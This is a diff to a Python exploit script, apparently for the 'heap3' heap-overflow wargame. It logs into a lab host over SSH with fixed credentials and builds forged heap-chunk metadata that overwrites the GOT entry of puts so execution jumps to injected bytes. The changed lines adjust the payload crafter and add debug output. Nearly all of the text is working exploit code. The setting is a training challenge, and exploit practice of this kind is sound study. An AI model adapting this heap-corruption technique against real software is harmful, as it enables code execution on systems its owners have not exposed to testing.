@@ -8,8 +8,10 @@ shell = ssh(user="user", host="192.168.5.199", password="user", port=22)
 GOT_PUTS = 0x0804b128
 SC = 0x804c008 + 8
 
-hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32)
+hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32, pre_preset={31:"a"})
+#hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32)
 prev, metadata, post = hpc.generate_payload()
+PREV_SIZE_C, SIZE_C = metadata
 
 arg1 = "A" * 8 + "\x68\x64\x88\x04\x08\xC3" + "AAAA"
 
@@ -28,18 +30,17 @@ arg3 = ''.join(post)
 
 print
 print
-print
+print "-=================================]"
 print "prev length = %d" % len(prev)
 print "post length = %d" % len(post)
-print "prev : %s" % repr(prev)
-print "metadata : ", metadata
-print "post : %s" % repr(post)
+print "PREV_SIZE_C   : %s   %d" % (hex(PREV_SIZE_C & 0xffffffff), PREV_SIZE_C)
+print "SIZE_C        : %s   %d" % (hex(SIZE_C & 0xffffffff), SIZE_C)
+print "-=================================]"
+print "prev          : %s" % repr(prev)
 print
-print
-print
+print "post          : %s" % repr(post)
 print
 
-open("dump", "w").write(arg1 + " " + arg2 + " " + arg3)
 p = shell.run(["/home/user/heap3", arg1, arg2, arg3])
 print p.recvline()
 
